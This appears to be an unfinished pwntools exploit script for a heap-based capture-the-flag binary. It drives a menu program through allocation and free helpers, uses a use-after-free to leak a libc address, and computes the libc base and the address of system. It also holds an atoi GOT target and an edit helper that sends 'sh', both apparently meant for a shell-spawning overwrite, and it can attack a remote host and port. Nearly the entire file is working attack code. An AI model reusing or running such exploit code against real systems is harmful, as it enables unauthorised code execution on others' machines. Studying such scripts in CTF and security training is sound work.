from pwn import *

atoi_got = 0x603110

def alloc(name, attack = 1,
		  defense = 2, speed = 3, precision = 4):

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('points: ')
	p.sendline(str(attack))

	p.recvuntil('points: ')
	p.sendline(str(defense))

	p.recvuntil('speed: ')
	p.sendline(str(speed))

	p.recvuntil('precision: ')
	p.sendline(str(precision))

	return

def edit(name):

	p.recvuntil('choice: ')
	p.sendline('4')

	p.recvuntil('choice: ')
	p.sendline('1')

	p.recvuntil('name: ')
	p.sendline(name)

	p.recvuntil('choice: ')
	p.sendline('sh')

	return

def select(idx):

	p.recvuntil('choice: ')
	p.sendline('3')

	p.recvuntil('index: ')
	p.sendline(str(idx))

	return

def free(idx):

	p.recvuntil('choice: ')
	p.sendline('2')

	p.recvuntil('index: ')
	p.sendline(str(idx))

	return

def show():

	p.recvuntil('choice: ')
	p.sendline('5')

	return

def pwn():

	alloc('A'*0x60)
	alloc('B'*0x60)
	alloc('C'*0x80)
	alloc('D'*0x80)

	select(2)

	free(2)

	show()

	p.recvuntil("Name: ")

	leak=u64(p.recv(6).ljust(8, "\x00"))
	libc_base=leak-0x3c4b78
	system = libc_base + 0x45390
	
	log.info("Libc: {:x}".format(libc_base))
	log.info("System: {:x}".format(system))

	free(3)
	pause()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        p = process('./main.elf')
        pwn()


